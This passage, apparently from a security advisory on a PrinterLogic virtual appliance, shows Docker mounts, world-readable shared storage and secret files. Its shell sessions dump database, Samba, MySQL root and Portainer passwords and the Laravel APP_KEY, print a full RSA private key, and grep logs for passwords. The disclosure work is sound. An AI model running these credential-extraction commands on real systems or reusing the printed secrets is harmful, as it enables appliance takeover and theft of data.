d4a0594b6121 printerlogic/ebc:1.0.34 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 9229/tcp printercloud_ebc.1.1e4rjf6mzq9t53swqdgxgfnwu
                "SHARED_STORAGE=/var/www/efs_storage",

ed12cf7e4428 printerlogic/oncp-reg:1.0.15 "/opt/entrypoint.sh " 4 hours ago Up 4 hours (healthy) printercloud_oncp-reg.1.y5dmk4y84g6rjyrt4t53syutz
                "SHARED_STORAGE=/var/www/efs_storage",

0ee9b6a63f59 printerlogic/idpi:1.0.6 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_idpi.1.35xxr3pqef00ivcn2no6y90rr
                "SHARED_STORAGE=/var/www/efs_storage",

6092ba3e4189 printerlogic/oncp-pgw:v1.0.21 "./cloud-print-print" 4 hours ago Up 4 hours (healthy) 80-81/tcp printercloud_oncp-pgw.1.x9j0c6o7ydf0ehb2pmwxb70fj
                "SHARED_STORAGE=/var/www/efs_storage",

11146de0ed76 dperson/samba:latest "/sbin/tini -- /opt/" 4 hours ago Up 4 hours (healthy) 139/tcp, 137-138/udp, 445/tcp config_samba.1.dfwyt1m90ab30k75fogxhcxcz
                    "Source": "/var/www/efs_storage",
                "Source": "/var/www/efs_storage",

7d39399f459a printerlogic/pi:5.0.6539 "/var/www/app/.docke" 4 hours ago Up 4 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-reports.1.es8sfg9p6zya8r8396izh5z1i
                    "Source": "/var/www/efs_storage/pi/cache",
                    "Source": "/var/www/efs_storage/null",
                    "Source": "/var/www/efs_storage/pi/storage",
                    "Source": "/var/www/efs_storage/pi/storage/api",
                    "Source": "/var/www/efs_storage/pi/storage/app",
                    "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                    "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/storage/app",
                "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/cache",
                "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/storage",
                "Source": "/var/www/efs_storage/pi/storage/api",
                "SHARED_STORAGE=/var/www/efs_storage",

bb96b17d45b8 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 4 hours ago Up 4 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-snmp.1.ttxndt3y7brnkw95vxluhht7l
                    "Source": "/var/www/efs_storage/pi/cache",
                    "Source": "/var/www/efs_storage/null",
                    "Source": "/var/www/efs_storage/pi/storage",
                    "Source": "/var/www/efs_storage/pi/storage/api",
                    "Source": "/var/www/efs_storage/pi/storage/app",
                    "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                    "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/storage",
                "Source": "/var/www/efs_storage/pi/storage/api",
                "Source": "/var/www/efs_storage/pi/storage/app",
                "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/cache",
                "Source": "/var/www/efs_storage/null",
                "SHARED_STORAGE=/var/www/efs_storage",

f784e1b43237 printerlogic/qms:1.0.124 "/opt/entrypoint.sh " 4 hours ago Up 4 hours (healthy) printercloud_qms.1.ek9zr8g67vb9k0s1n9nv2s736
                "SHARED_STORAGE=/var/www/efs_storage",

9ad5da8b9d25 printerlogic/sched:1.0.18 "/var/www/app/.docke" 4 hours ago Up 4 hours 80/tcp, 443/tcp, 9000/tcp printercloud-appliance_worker-scheduler.1.sy93cqxhn8fjypvfg9eu78may
                "SHARED_STORAGE=/var/www/efs_storage",

a2cac82b5586 printerlogic/users:5.186.1 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_users.1.zoorlq8nwkx15smt2cegigo8h
                    "Source": "/var/www/efs_storage/users/storage",
                "Source": "/var/www/efs_storage/users/storage",
                "SHARED_STORAGE=/var/www/efs_storage",

b3b7793a3e95 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 4 hours ago Up 4 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-low.1.whls4vm5xshz3h44c462iwdc1
                    "Source": "/var/www/efs_storage/pi/cache",
                    "Source": "/var/www/efs_storage/null",
                    "Source": "/var/www/efs_storage/pi/storage",
                    "Source": "/var/www/efs_storage/pi/storage/api",
                    "Source": "/var/www/efs_storage/pi/storage/app",
                    "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                    "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/cache",
                "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/storage",
                "Source": "/var/www/efs_storage/pi/storage/api",
                "Source": "/var/www/efs_storage/pi/storage/app",
                "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                "Source": "/var/www/efs_storage/null",
                "SHARED_STORAGE=/var/www/efs_storage",

77c42d53c3b2 mysql:8.0.26 "docker-entrypoint.s" 4 hours ago Up 4 hours (healthy) 3306/tcp, 33060/tcp storage_mysql.1.ff8nbsv250u5d3vqk9r62ripe
                    "Source": "/var/www/efs_storage/mysql",
                    "Source": "/var/www/efs_storage/exodus",
                "Source": "/var/www/efs_storage/mysql",
                "Source": "/var/www/efs_storage/exodus",

b4f9ccdf92cb printerlogic/gw:1.208.5 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_gw.1.vznnoqqf3kbhcwfwkl3plzi39
                "SHARED_STORAGE=/var/www/efs_storage",

ac69cca5df62 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 4 hours ago Up 4 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-high.1.3cr0gdxirucwzdk2j5d0rbtja
                    "Source": "/var/www/efs_storage/pi/cache",
                    "Source": "/var/www/efs_storage/null",
                    "Source": "/var/www/efs_storage/pi/storage",
                    "Source": "/var/www/efs_storage/pi/storage/api",
                    "Source": "/var/www/efs_storage/pi/storage/app",
                    "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                    "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/storage",
                "Source": "/var/www/efs_storage/pi/storage/api",
                "Source": "/var/www/efs_storage/pi/storage/app",
                "Source": "/var/www/efs_storage/pi/storage/framework/sessions",
                "Source": "/var/www/efs_storage/null",
                "Source": "/var/www/efs_storage/pi/cache",
                "Source": "/var/www/efs_storage/null",
                "SHARED_STORAGE=/var/www/efs_storage",

f37db8c79a50 printerlogic/br:1.0.62 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp printercloud_br.1.30m12skgwj5mu3y0ypfkp319q
                "SHARED_STORAGE=/var/www/efs_storage",

9098f6052c94 printerlogic/identity:v1.0.88 "/usr/local/bin/iden" 4 hours ago Up 4 hours (healthy) 80/tcp printercloud_identity.1.8x0lwby90079bojeabu8vhead
                "SHARED_STORAGE=/var/www/efs_storage",

0bf820403a1a printerlogic/edw:1.0.44 "/opt/entrypoint.sh " 4 hours ago Up 4 hours (healthy) printercloud_edw.1.yt5pd4mmletn81vs3wo5dz77q
                "SHARED_STORAGE=/var/www/efs_storage",

bf43c1f6503e printerlogic/users:5.186.1 "/var/www/app/.docke" 4 hours ago Up 4 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-users-queue.1.n3hbhjezaps6gwkw1nuqupdq4
                "SHARED_STORAGE=/var/www/efs_storage",

bc477aaff3d7 printerlogic/oncp-ofn:v1.0.6 "off-network-app" 4 hours ago Up 4 hours (healthy) 80/tcp printercloud_oncp-ofn.1.szvk26xlr897j96p2z29hlv9p
                "SHARED_STORAGE=/var/www/efs_storage",

171c014430d7 printerlogic/tree:1.0.57 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_tree.1.7n99xw0qv856wjvj3eleaflij
                "SHARED_STORAGE=/var/www/efs_storage",

a7656e45349d traefik:latest "/srv/entrypoint.sh " 4 hours ago Up 4 hours 80/tcp networking_traefik.1.rjigvw3twkt4qkeldzbqbqn2u
                    "Source": "/var/www/efs_storage/certs",
                    "Source": "/var/www/efs_storage/pi/storage/certs",
                    "Target": "/var/www/efs_storage/pi/storage/certs",
                "Source": "/var/www/efs_storage/pi/storage/certs",
                "Destination": "/var/www/efs_storage/pi/storage/certs",
                "Source": "/var/www/efs_storage/certs",

8ec8a6bf4555 printerlogic/scim:1.0.9 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_scim.1.okyfdbo5ct76v54eppsanw0me
                "SHARED_STORAGE=/var/www/efs_storage",

e9994d5a21bf printerlogic/prs:1.0.2 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 9229/tcp printercloud_prs.1.6uuzdvqkb39u910gw9e3yupfy
                "SHARED_STORAGE=/var/www/efs_storage",

5b99b9c2a4b2 printerlogic/eb:0.0.4 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 3000/tcp, 9229/tcp printercloud_eb.1.wtzjn9sdbl6wva6dy3u1y1nh5
                "SHARED_STORAGE=/var/www/efs_storage",

d2e3989f4cf3 printerlogic/cpp-ui:1.80.5 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_cpp-ui.1.qhmgeshht9gip0quyhppdogv3
                "SHARED_STORAGE=/var/www/efs_storage",

fce5597bbe3d printerlogic/va-cdn:0.0.435 "/docker-entrypoint." 4 hours ago Up 4 hours 80/tcp printercloud-appliance_va-cdn.1.copecxekt4rwuxfq4tynfm1a6
                "SHARED_STORAGE=/var/www/efs_storage",

294dbdd973da printerlogic/scd:1.0.70 "/var/www/app/.docke" 4 hours ago Up 4 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_scd.1.3eef4r68kmkqnc5dcswa3xjhv
                    "Source": "/var/www/efs_storage/scd/storage",
                "Source": "/var/www/efs_storage/scd/storage",
                "SHARED_STORAGE=/var/www/efs_storage",

6cb464ab04b7 portainer/agent:latest "./agent" 4 hours ago Up 4 hours printercloud_portainer-agent.a6zgwxfp4n2v4tdi8u7b40shy.aoew1w8ym8p1hai6ch38dau7j

55b64c63a9f6 printerlogic/pq:5.0.124 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 443/tcp, 9000/tcp printercloud_pq.1.vwp9poc8belv24mxwijeeetct
                    "Source": "/var/www/efs_storage/pq/storage",
                "Source": "/var/www/efs_storage/pq/storage",
                "SHARED_STORAGE=/var/www/efs_storage",

a7bff45e538c printerlogic/ofn:1.108.0 "off-network-app" 4 hours ago Up 4 hours (healthy) 80/tcp printercloud_ofn.1.18qn5bj4eqgpbq2d94k6hy8vx
                    "Source": "/var/www/efs_storage/ofn/storage",
                "Source": "/var/www/efs_storage/ofn/storage",
                "SHARED_STORAGE=/var/www/efs_storage",

317daac676fd printerlogic/scss:1.0.39 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 9229/tcp printercloud_scss.1.uc6fcunwy1s3hdb6di4avqlzb
                "SHARED_STORAGE=/var/www/efs_storage",

6b3781947b83 printerlogic/client:25.1.0.551 "/bin/sh -c 'supervi" 4 hours ago Up 4 hours printercloud-appliance_client.1.pnbxglabahqd9prozbvbs55sc
                    "Source": "/var/www/efs_storage/client/ppd",
                    "Source": "/var/www/efs_storage/client/printers",
                    "Source": "/var/www/efs_storage/client/jobs",
                    "Source": "/var/www/efs_storage/logs/client",
                    "Source": "/var/www/efs_storage/client/tmp",
                    "Source": "/var/www/efs_storage/client/etc",
                "Source": "/var/www/efs_storage/client/tmp",
                "Source": "/var/www/efs_storage/client/etc",
                "Source": "/var/www/efs_storage/client/ppd",
                "Source": "/var/www/efs_storage/client/printers",
                "Source": "/var/www/efs_storage/client/jobs",
                "Source": "/var/www/efs_storage/logs/client",

1d856b21e63d redis:5-alpine "docker-entrypoint.s" 4 hours ago Up 4 hours (healthy) 6379/tcp storage_redis.1.zachure4n159uah7xsu3ixau6

a842502dcc97 printerlogic/cat:1.0.58 "/var/www/app/.docke" 4 hours ago Up 4 hours (healthy) 80/tcp, 9229/tcp printercloud_cat.a6zgwxfp4n2v4tdi8u7b40shy.fgp2p5wo56hg4sanjmirpoyzl
                "SHARED_STORAGE=/var/www/efs_storage",

022c2a2201b4 printerlogic/hive:1.1.30 "/opt/entrypoint.sh " 6 days ago Up 4 hours cicd_hive_1
                "/var/www/efs_storage:/var/www/efs_storage:rw",
                "Source": "/var/www/efs_storage",
                "Destination": "/var/www/efs_storage",
                "/var/www/efs_storage": {}
</code></pre>
<p>Testing a random docker instance will confirm there is a full access to the <code>/var/www/efs_storage</code> directory. A <code>test</code> directory will be created in <code>/var/www/efs_storage</code> from the <code>printerlogic/va-api</code> instance:</p>
<pre>
root@printerlogic:/var/www/efs_storage# docker ps|grep api
16178d2bccb2        printerlogic/va-api:1.1.4        "/opt/entrypoint.sh "   5 hours ago         Up 5 hours (healthy)   80/tcp                           printercloud-appliance_va-api.1.fwacyv7l7gqxqrtwox45kvp1i
root@printerlogic:/var/www/efs_storage# docker exec -it 16178d2bccb2 /bin/sh
/ # cd /var/www/efs_storage
/var/www/efs_storage # ls -la 
total 96
drwxrwsr-x   18 xfs      ping          4096 Feb  2 08:15 .
drwxr-xr-x    1 root     root          4096 Oct 13 16:29 ..
drwxrwsr-x    6 root     ping          4096 Jan 28 02:28 .hive
drwxrwsr-x    2 1000     ping          4096 Jan 27 09:36 .secrets
-rw-rw-r--    1 1000     ping            56 Jan 27 10:16 .update_history
drwxrwsr-x    3 root     ping          4096 Jan 27 10:18 .updates
drwxrwsr-x    2 xfs      ping          4096 Jan 27 09:37 certs
drwxrwsr-x    7 1000     ping          4096 Jan 27 09:37 client
drwxrwsr-x    2 xfs      ping          4096 Jan 27 09:36 exodus
drwxrwsr-x    4 1000     ping          4096 Jan 27 09:37 logs
drwxrwsr-x    2 root     ping         16384 Jan 27 09:34 lost+found
drwxrwsr-x   18 999      ping          4096 Feb  2 03:37 mysql
drwxrwsr-x    2 xfs      ping          4096 Jan 27 09:36 null
drwxrwsr-x    3 1000     ping          4096 Jan 27 09:36 ofn
drwxr-sr-x    6 root     root          4096 Jan 27 10:18 pc-sys
drwxrwsr-x    4 1000     ping          4096 Jan 27 09:36 pi
drwxrwsr-x    3 1000     ping          4096 Jan 27 09:36 pq
drwxrwsr-x    3 1000     ping          4096 Jan 27 09:36 scd
-rwxrwsr-x    1 root     ping          3519 Jan 27 09:36 secrets.env
drwxrwsr-x    3 1000     ping          4096 Jan 27 09:36 users
/var/www/efs_storage # <font color=red>mkdir test</font>
/var/www/efs_storage # ls -la
total 100
drwxrwsr-x   19 xfs      ping          4096 Feb  2 08:15 .
drwxr-xr-x    1 root     root          4096 Oct 13 16:29 ..
drwxrwsr-x    6 root     ping          4096 Jan 28 02:28 .hive
drwxrwsr-x    2 1000     ping          4096 Jan 27 09:36 .secrets
-rw-rw-r--    1 1000     ping            56 Jan 27 10:16 .update_history
drwxrwsr-x    3 root     ping          4096 Jan 27 10:18 .updates
drwxrwsr-x    2 xfs      ping          4096 Jan 27 09:37 certs
drwxrwsr-x    7 1000     ping          4096 Jan 27 09:37 client
drwxrwsr-x    2 xfs      ping          4096 Jan 27 09:36 exodus
drwxrwsr-x    4 1000     ping          4096 Jan 27 09:37 logs
drwxrwsr-x    2 root     ping         16384 Jan 27 09:34 lost+found
drwxrwsr-x   18 999      ping          4096 Feb  2 03:37 mysql
drwxrwsr-x    2 xfs      ping          4096 Jan 27 09:36 null
drwxrwsr-x    3 1000     ping          4096 Jan 27 09:36 ofn
drwxr-sr-x    6 root     root          4096 Jan 27 10:18 pc-sys
drwxrwsr-x    4 1000     ping          4096 Jan 27 09:36 pi
drwxrwsr-x    3 1000     ping          4096 Jan 27 09:36 pq
drwxrwsr-x    3 1000     ping          4096 Jan 27 09:36 scd
-rwxrwsr-x    1 root     ping          3519 Jan 27 09:36 secrets.env
<font color=red>drwxrwsr-x    2 root     ping          4096 Feb  2 08:15 test</font>
drwxrwsr-x    3 1000     ping          4096 Jan 27 09:36 users
/var/www/efs_storage #
</pre>

<p>Furthermore, the directory <code>/var/www/efs_storage</code> contains credentials used by the appliance. By default, everything is world-readable.</p>
<p>Listing of <code>/var/www/efs_storage</code>:</p>
<pre>
root@printerlogic:/var/www/efs_storage# ls -la /var/www/efs_storage/
total 92
drwxrwsr-x+ 18 www-data docker  4096 Jan 27 10:18 .
drwxrwsr-x+  6 ubuntu   docker  4096 Dec 28 18:10 ..
drwxrwsr-x+  2 www-data docker  4096 Jan 27 09:37 certs
drwxrwsr-x+  7 ubuntu   docker  4096 Jan 27 09:37 client
drwxrwsr-x+  2 www-data docker  4096 Jan 27 09:36 exodus
drwxrwsr-x+  6 root     docker  4096 Jan 28 02:28 .hive
drwxrwsr-x+  4 ubuntu   docker  4096 Jan 27 09:37 logs
drwxrwsr-x+  2 root     docker 16384 Jan 27 09:34 lost+found
drwxrwsr-x+ 18      999 docker  4096 Feb  2 03:37 mysql
drwxrwsr-x+  2 www-data docker  4096 Jan 27 09:36 null
drwxrwsr-x+  3 ubuntu   docker  4096 Jan 27 09:36 ofn
drwxr-sr-x+  6 root     root    4096 Jan 27 10:18 pc-sys
drwxrwsr-x+  4 ubuntu   docker  4096 Jan 27 09:36 pi
drwxrwsr-x+  3 ubuntu   docker  4096 Jan 27 09:36 pq
drwxrwsr-x+  3 ubuntu   docker  4096 Jan 27 09:36 scd
drwxrwsr-x+  2 ubuntu   docker  4096 Jan 27 09:36 .secrets
<font color=red>-rwxrwsr-x+  1 root     docker  3519 Jan 27 09:36 secrets.env</font>
-rw-rw-r--+  1 ubuntu   docker    56 Jan 27 10:16 .update_history
drwxrwsr-x+  3 root     docker  4096 Jan 27 10:18 .updates
drwxrwsr-x+  3 ubuntu   docker  4096 Jan 27 09:36 users
root@printerlogic:/var/www/efs_storage#
</pre>

<p>It is possible to extract passwords from these files from any user because the files are world-readable.</p>
<p>Content of <code>/var/www/efs_storage/secrets.env</code>:</p>
<pre>
root@printerlogic:/var/www/efs_storage# cat secrets.env  | tail -n 7
########### VALUES
<font color=red>DB_DATABASE="app_pi"
DB_PASSWORD="BBlIL1X1ARvyrnA3FBpt"
DB_PORT="3306"
DB_USERNAME="admin"</font>
PRINTERCLOUD_DOMAIN="10.105.0.241"
<font color=red>SAMBA_PASSWORD="4rd7AqdBvj7ZdGKrvQ9Z"</font>
root@printerlogic:/var/www/efs_storage#
</pre>

<p>It is also possible to decrypt the GPG-encrypted files stored in <code>/var/www/efs_storage/.secrets/</code> using the private key that has been extracted before in <a href="#va-private-gpg-key">GPG Private key stored in the solution</a>. The files contain the mysql root password, the <code>APP_KEY</code> value used for Laravel and the portainer password. Access to the <code>APP_KEY</code> provides remote code execution on Laravel instances.</p>
<p>Decrypted files in /var/www/efs_storage/.secrets:</p>
<pre>
root@printerlogic:~# ls -la /var/www/efs_storage/.secrets/
total 16
drwxrwsr-x+  2 ubuntu   docker 4096 Feb  8 06:38 .
drwxrwsr-x+ 19 www-data docker 4096 Feb  2 08:15 ..
<font color=red>-rw-rw-r--+</font>  1 ubuntu   docker  704 Jan 27 09:36 app-keys.gpg
<font color=red>-rw-rw-r--+</font>  1 ubuntu   docker  660 Feb  7 08:59 portainer-admin.gpg
root@printerlogic:~# cd /var/www/efs_storage/.secrets
root@printerlogic:/var/www/efs_storage/.secrets# gpg app-keys.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team <no-reply+virtual-appliance@printerlogic.com>"
root@printerlogic:/var/www/efs_storage/.secrets# cat app-keys
<font color=red>APP_KEY="1U3leCKOyUKV2NHfYHFJ3bH9l5JU8X7M"
MYSQL_ROOT_PASSWORD="0aa58a30-9f32-4731-a03c-3795fe49c0f3"</font>
root@printerlogic:/var/www/efs_storage/.secrets# gpg portainer-admin.gpg 
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team <no-reply+virtual-appliance@printerlogic.com>"
root@printerlogic:/var/www/efs_storage/.secrets# cat portainer-admin
<font color=red>PORTAINER_PASSWORD="1bd01aeb-e29d-4de6-83ca-11e55858c6ae"</font>
root@printerlogic:/var/www/efs_storage/.secrets#
</pre>

<p>We can verify these passwords are correct using the root access on the solution. These decrypted passwords match the passwords defined in environment variables.</p>
<p>Extracting passwords from environment variables:</p>
<pre>
root@printerlogic:~# for i in $(docker ps | awk '{ print $1 }'); do echo $(docker ps | grep $i | awk '{ print $1'}); docker exec -it $i env;done|grep MYSQL_ROOT
Error: No such container: CONTAINER
<font color=red>MYSQL_ROOT_PASSWORD=0aa58a30-9f32-4731-a03c-3795fe49c0f3</font>
root@printerlogic:~# for i in $(docker ps | awk '{ print $1 }'); do echo $(docker ps | grep $i | awk '{ print $1'}); docker exec -it $i env;done|grep APP_KEY
Error: No such container: CONTAINER
<font color=red>APP_KEY=1U3leCKOyUKV2NHfYHFJ3bH9l5JU8X7M
APP_KEY=1U3leCKOyUKV2NHfYHFJ3bH9l5JU8X7M
APP_KEY=1U3leCKOyUKV2NHfYHFJ3bH9l5JU8X7M
APP_KEY=1U3leCKOyUKV2NHfYHFJ3bH9l5JU8X7M</font>
[...]
</pre>

<p>It is also possible to reach the portainer agent running in the <code>portainer/agent</code> Docker instance on port 9001/tcp from any Docker instance. An attacker may use the <code>PORTAINER_PASSWORD</code> value to control the portainer agent.</p>
<p>Using the mysql credentials, it is possible to compromise the application from any docker instance that has the <code>/var/www/efs_storage</code> mounting point - there is no firewall between docker instances so all the docker instances have a full network access to the mysql server and they also have access to the mysql credentials from <code>/var/www/efs_storage/secrets.env</code> and the Laravel application key, allowing Remote Code Execution against Docker instances that run Nginx with PHP.</p>
<p>Moreover, the session files are world-readable.</p>
<p>Extracting sessions from <code>/var/www/efs_storage/pi/storage/framework/sessions</code>:</p>
<pre><code>root@printerlogic:/var/www/efs_storage# ls -la ./pi/storage/framework/sessions/
total 12
drwxrwsr-x+ 2 www-data docker   4096 Feb  2 03:38 .
drwxrwsr-x+ 5 www-data www-data 4096 Jan 27 09:37 ..
-rw-rw-r--+ 1 www-data docker    118 Feb  2 03:38 jIHjRaArwpNVBdE9EokQeQoD0oYdaw4aq87oqAK0
root@printerlogic:/var/www/efs_storage# cat ./pi/storage/framework/sessions/jIHjRaArwpNVBdE9EokQeQoD0oYdaw4aq87oqAK0 ; echo
a:2:{s:6:"_token";s:40:"gGVo8IMaJbVz5ZXPY8ThCeFCLbE8wa09UvCdMXXV";s:6:"_flash";a:2:{s:3:"old";a:0:{}s:3:"new";a:0:{}}}
root@printerlogic:/var/www/efs_storage#
</code></pre>
<p>From the Docker instances, as the applications run as root, there is a full access to any file in <code>/var/www/efs_storage</code>, as shown below.</p>
<p>For example, the <code>client-key.pem</code> file used in Mysql is owned by mysql and the permissions are <code>600</code>. There is a full Read/Write access from the Docker image <code>printerlogic/va-api</code>.</p>
<p>Reading <code>client-key.pem</code> as root from the Docker instance <code>printerlogic/va-api</code>:</p>
<pre><code>/var/www/efs_storage/mysql # ls -la 
total 214684
[...]
-rw-------    1 999      ping          1680 Jan 27 09:36 client-key.pem
[...]
/var/www/efs_storage/mysql # cat client-key.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAvC7hbdFLOPXiolgs+MM+jHAu1160g91yoLhbSZTUTUGNMM6+
t2btq5F4UtH1G6SUzuQs7d2BCrpyrTkB2idkiKlFVUPVVKEFOXwBsnMcotqfL/9N
dyEVwxa6Lp0hHRWaOPntTx56+nCl95Ab7CGMJp2i2Nr0qrhOjv+0idVeiTUGGpSp
cWQQilOwCgS/nDAuGBfmT9Mk2ARPDyV/lsJR4wEm1yAQWJ5cQrhhpriZRMFMwZUs
dg1BfcRfxtRpo8M097HjkERKsPjUHIxbxYWDvfN8PJFTgUChaZ3T5AuCsLYleirV
pNRxTj2UT9bjOfU4qWNc3crMgu017qqsZLqbZwIDAQABAoIBAATIpE5oXaMrDQHX
f/0q6XIkf+xVqf0YKgvP4/Iw6Fy2Z+JvvwVmhnAwGIDyeWqkemvv/Pxm/xrItpWU
t2lWSwX2V57dRJUMKtfVQS3KI1Y4fId50/xNSQJWl5ELyYW1wN/l6pRyT+oB5xYu
Aae1Cp0IsNUWa9XTLZwRAAPo+qg+N6ketWyzjW5Fw6KfLbksF/QV6eWJwBOCDbJo
gfXzXaSUhDXsEjVoCSa3HIvBmxrfzVx5R1Zr+r3tKAyhbnYYoH6RNOnSlp4TVpKD
UJ9PowDWpIL/eGH65iHfDwfOaEeck6Ty4ADYCtzygAfJTcW2HXywdOAPtRrqv1gD
HoLcX3ECgYEA4v4WKOIrGI20KADmRxeayPBViUqSYk49esgP9rKuXbd+W2GBvPpJ
APesO9CbBszIOe8/T2+Efg9MywevlJWydtTqnUtNlTIQPBynrUXGf+fIkkjhAF+T
5OMfPo/fvsfSJS86H2WBZqr2mmciSlXgMtQRnknKcla0X2MbDof73L0CgYEA1Dsr
cPoFUXHWP8FjQhFdmMIORlzk7fwUtD7BRYRL8vLwYzWm6R1zY3m4XLa+yMqA38N8
Tsfx/xEOevbZXs7loHMJHxTKYwf7PatllTPMLntBJBdXS9cbDE+bo/KHVZPwGd+a
0pBzWwEbzP7vXR1C7+PFrA8l+UUjSQ9U1mmrpPMCgYBcCodVwI+U/zCD4Al/3jRn
MfydFN3SesM3HBRNBhrp6VOVHi6LQDmF6OevwWB7G2I9C6PyQ9fHfdC3qsApUaHx
yVfwu+4Thx9KIJxlCBv7FTMhDegeTKMddnLe3VvucfvmFAZPYMtdpAkmhpdC6Rtl
wNP8CRPL1RiCbR81fzJDSQKBgQCaUDuR9fkP8xm5Wb/2NfI8ND104+6BLB1RwZ9+
EGe4yvQG7ufh8EwKNGLc5vNpw/RYvycPkUpgD+LbfcknqoBEXeBv/Qn7X75KZOmD
xxnbYjtHJsGOn2VHWkrstle43cxiw7crC2UU8oVoVKVuquwUySTdqlYOHTs+0Cr7
i/IGCQKBgQCCFghgRsQabDYo8ou7TPTQ4o+5bb0bnskps/Vrgpx11iom/9WNZGbP
VS63QifOzog+fP68Evw6uriy9Y+VUnLcRDIPfyXUncpClRKcAzh0YakBP6A3Lqnv
hZLW8dhZKQqyIMUtOra5tKMqstCLnNd0yaMALY1VgchJ93UGjMIKzg==
-----END RSA PRIVATE KEY-----
/var/www/efs_storage/mysql #
</code></pre>
<p>From the world-readable logs, it is also possible to extract valid passwords:</p>
<p>Extracting the mysql password from logs:</p>
<pre>
root@printerlogic:/var/www/efs_storage/logs/oddhok71vqjdjhjtous8xy3vx# ls -la
total 940
drwxrwsr-x+ 2 root   docker   4096 Feb  2 06:25 .
drwxrwsr-x+ 4 ubuntu docker   4096 Jan 27 09:37 ..
-rw-rw-r--+ 1 syslog syslog   2008 Feb  4 02:08 config.log
-rw-r--r--  1 syslog adm      2740 Jan 28 02:29 config.log-20220128.xz
-rw-rw-r--+ 1 syslog syslog    332 Jan 31 05:24 config.log-20220131.xz
-rw-rw-r--+ 1 syslog syslog    288 Feb  1 00:58 config.log-20220201.xz
-rw-rw-r--+ 1 syslog syslog    502 Feb  2 03:37 config.log-20220202
-rw-rw-r--+ 1 syslog syslog  24153 Feb  4 05:17 cron.log
-rw-r--r--  1 syslog adm       848 Jan 28 06:25 cron.log-20220128.xz
-rw-rw-r--+ 1 syslog syslog    236 Jan 31 06:25 cron.log-20220131.xz
-rw-rw-r--+ 1 syslog syslog   1064 Feb  1 06:25 cron.log-20220201.xz
-rw-rw-r--+ 1 syslog syslog    696 Feb  2 06:25 cron.log-20220202
-rw-rw-r--+ 1 syslog syslog   4396 Feb  4 02:08 init.log
-rw-r--r--  1 syslog adm      2748 Jan 28 02:29 init.log-20220128.xz
-rw-rw-r--+ 1 syslog syslog    468 Jan 31 05:25 init.log-20220131.xz
-rw-rw-r--+ 1 syslog syslog    532 Feb  1 04:14 init.log-20220201.xz
-rw-rw-r--+ 1 syslog syslog   1558 Feb  2 03:39 init.log-20220202
-rw-rw-r--+ 1 syslog syslog  72050 Feb  4 05:37 pi.log
-rw-r--r--+ 1 syslog adm      7600 Jan 28 02:29 pi.log-20220128.xz
-rw-rw-r--+ 1 syslog syslog   3964 Jan 31 05:34 pi.log-20220131.xz
[...]
root@printerlogic:/var/www/efs_storage/logs/oddhok71vqjdjhjtous8xy3vx# xzgrep -i password *xz
[...]
services.log-20220131.xz:Jan 31 05:11:47 printerlogic va/printercloud_pq.1.oudnppibc8qwbym8z1wp91664[1547]: + timeout 180 bash -c     until mysql     -h mysql     -u admin     -P 3306     --password="<font color=red>BBlIL1X1ARvyrnA3FBpt</font>"     -e 'CREATE SCHEMA IF NOT EXISTS `app_pi`';     do sleep 5; done
services.log-20220131.xz:Jan 31 05:11:51 printerlogic va/printercloud_scd.1.84yt6sjlse8b2wz163dd1o0du[1547]: + timeout 180 bash -c '    until mysql     -h mysql     -u admin     -P 3306     --password="<font color=red>BBlIL1X1ARvyrnA3FBpt</font>"     -e '"'"'CREATE SCHEMA IF NOT EXISTS `app_scd`'"'"';     do sleep 5; done
